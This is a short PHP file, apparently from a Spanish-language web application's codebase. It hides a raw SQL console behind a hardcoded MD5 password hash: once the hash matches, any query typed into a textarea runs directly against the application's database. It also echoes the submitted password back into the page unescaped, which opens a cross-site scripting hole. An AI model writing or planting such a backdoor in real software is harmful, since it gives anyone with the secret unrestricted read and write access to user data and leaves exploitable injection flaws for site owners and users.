<?php
include ('../appRoot.php');
require ($appRoot.'/Autentificacion/Usuarios.php');
//Funciones auxiliares:
include ($appRoot.'/Common/php/utils/lang.php');
include_once ($appRoot.'/Common/php/utils/utils.php');
//Opciones

if(md5($_POST['pass']) == 'dddddb1b6b5fab8152bab950d657de3f'){
?>
<form action="" method="post">
	<textarea name="query" rows="20" cols="100">

	</textarea>
	<input type="submit" name="exec" value="exec" />
	<input type="hidden" name="pass" value="<?php echo $_POST['pass']?>" />
</form>
<?php

	if($_POST['exec']){
		$query = $_POST['query'];
		if(! $result = mysql_query($query)){
			echo "mierda";
		}else echo $result;
	}

}else{
	?>
<form action="" method="post"><input type="text" name="pass" value="" /></form>
<?php } ?>
